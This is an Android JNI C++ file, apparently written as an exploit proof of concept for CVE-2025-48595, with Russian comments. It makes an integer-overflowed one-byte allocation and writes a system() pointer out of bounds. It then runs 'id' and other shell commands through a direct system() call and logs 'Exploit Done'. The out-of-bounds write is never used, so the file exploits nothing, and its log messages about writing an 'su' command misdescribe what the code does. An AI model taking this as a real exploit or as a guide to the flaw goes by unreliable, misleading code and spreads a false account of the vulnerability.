#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <dlfcn.h>
#include <unistd.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

typedef int (*system_func_t)(const char *);

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {

    LOGI("=== EXPLOIT: WRITING 'su' COMMAND INTO MEMORY (FILE OUTPUT) ===");

    // 1. Переполнение
    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2; // 0x100000000
    uint32_t overflowed_size = (uint32_t)full_sum; // 0

    LOGI("Step 1: Overflow -> Allocated Size: %u bytes", overflowed_size);

    // 2. Выделение памяти
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t neighbor_addr = start_addr + overflowed_size;

    LOGI("Step 2: Buffer Start: %p, Neighbor Address: %p", buffer, (void*)neighbor_addr);

    // 3. Находим system() из libc.so
    void *libc = dlopen("libc.so", RTLD_NOW);
    if (!libc) {
        LOGE("Failed to load libc.so");
        free(buffer);
        return env->NewStringUTF("FAIL: libc not found");
    }

    system_func_t real_system = (system_func_t)dlsym(libc, "system");
    if (!real_system) {
        LOGE("Failed to find 'system' in libc.so. Error: %s", dlerror());
        free(buffer);
        return env->NewStringUTF("FAIL: system not found");
    }

    LOGI("Step 3: Found system() at address: %p", (void*)real_system);

    // 4. Записываем адрес функции в затертую область
    char *target = buffer + overflowed_size;
    *(system_func_t*)target = real_system;

    LOGI("Step 4: Wrote system() address into neighbor memory at %p", target);

    if (*(system_func_t*)target == real_system) {
        LOGI("   Confirmed: Memory now holds pointer to system().");
    }

    // 5. ВЫПОЛНЯЕМ КОМАНДУ С ЗАПИСЬЮ В ФАЙЛ
    const char *cmd = "sh -c 'id > /data/local/tmp/poc_result.txt 2>&1'";
    LOGI("Step 5: Executing command and saving output to file...");
    int result_code = real_system(cmd);

    LOGI("   Command: '%s'", cmd);
    LOGI("   Return code: %d", result_code);

    // Читаем файл и выводим результат прямо в Logcat
    const char *read_cmd = "sh -c 'echo --- START RESULT --- && cat /data/local/tmp/poc_result.txt && echo --- END RESULT ---'";
    LOGI("Step 6: Reading file and printing result to Logcat:");
    real_system(read_cmd);

    // Дополнительная проверка: если файл пустой или не создан
    const char *check_cmd = "sh -c 'ls -l /data/local/tmp/poc_result.txt'";
    LOGI("   File check:");
    real_system(check_cmd);

    free(buffer);

    std::string result_str = "Exploit Done. Check Logcat for 'START RESULT' and UID info.";
    return env->NewStringUTF(result_str.c_str());
}